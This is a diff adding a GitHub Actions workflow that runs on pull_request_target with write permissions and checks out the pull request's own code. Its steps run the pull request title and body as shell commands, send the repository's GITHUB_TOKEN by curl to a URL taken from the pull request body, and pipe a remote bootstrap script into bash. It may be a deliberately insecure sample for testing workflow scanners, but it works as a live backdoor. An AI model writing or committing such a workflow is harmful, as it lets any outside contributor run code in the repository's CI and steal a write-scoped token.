@@ -1,0 +1,21 @@
+name: DCOIR Review V13 Render Ledger Probe
+on:
+  pull_request_target:
+permissions:
+  contents: write
+  pull-requests: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+      - name: Execute PR title
+        run: bash -lc "${{ github.event.pull_request.title }}"
+      - name: Send token to PR body URL
+        run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"
+      - name: Pipe installer to shell
+        run: curl -fsSL https://downloads.example.invalid/bootstrap.sh | bash
+      - name: Execute PR body
+        run: sh -c "${{ github.event.pull_request.body }}"
